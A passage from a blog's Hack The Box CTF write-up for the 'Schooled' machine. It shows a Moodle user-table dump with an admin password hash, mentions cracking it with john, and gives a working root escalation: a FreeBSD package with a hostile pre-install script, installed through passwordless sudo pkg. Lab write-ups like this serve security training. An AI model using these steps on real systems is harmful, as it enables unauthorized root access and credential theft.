</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=mysql_exec.png alt="MySQL tables"></p><p>We dump the users:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> mdl_user;
</span></span></code></pre></td></tr></table></div></div><p>The interesting line here is:</p><pre tabindex=0><code>admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW          Jamie   Borham  jamie@staff.schooled.htb
</code></pre><p>We need to crack this hash. Let&rsquo;s use john:</p><p><img loading=lazy src=jamie.png alt="Jamie password"></p><p>We can SSH with this.</p><h2 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h2><p>Classic:</p><pre tabindex=0><code>sudo -l

(NOPASSWD) /usr/sbin/pkg update
(NOPASSWD) /usr/sbin/pkg install *
</code></pre><p>Using this <a href=https://gtfobins.github.io/gtfobins/pkg/>https://gtfobins.github.io/gtfobins/pkg/</a> we build our package to RCE as root:</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># local</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;cat /root/root.txt&#39;</span> &gt; a.sh
</span></span><span style=display:flex><span>fpm -n x -s dir -t freebsd -a all --before-install a.sh .
</span></span><span style=display:flex><span>scp x-1.0.txz jamie@schooled.htb:/tmp
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e># ssh</span>
</span></span><span style=display:flex><span>sudo /usr/sbin/pkg install -y --no-repo-update /tmp/x-1.0.txz
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>/root/root.txt hash here
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=rooted.png alt=Rooted.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://0xninja.fr/tags/htb/>htb</a></li><li><a href=https://0xninja.fr/tags/writeup/>writeup</a></li></ul><nav class=paginav><a class=prev href=https://0xninja.fr/posts/htb-previse/><span class=title>« Prev Page</span><br><span>📦 HTB - Previse</span></a>
<a class=next href=https://0xninja.fr/posts/htb-bountyhunter/><span class=title>Next Page »</span><br><span>📦 HTB - BountyHunter</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://0xninja.fr>0xNinja - My blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>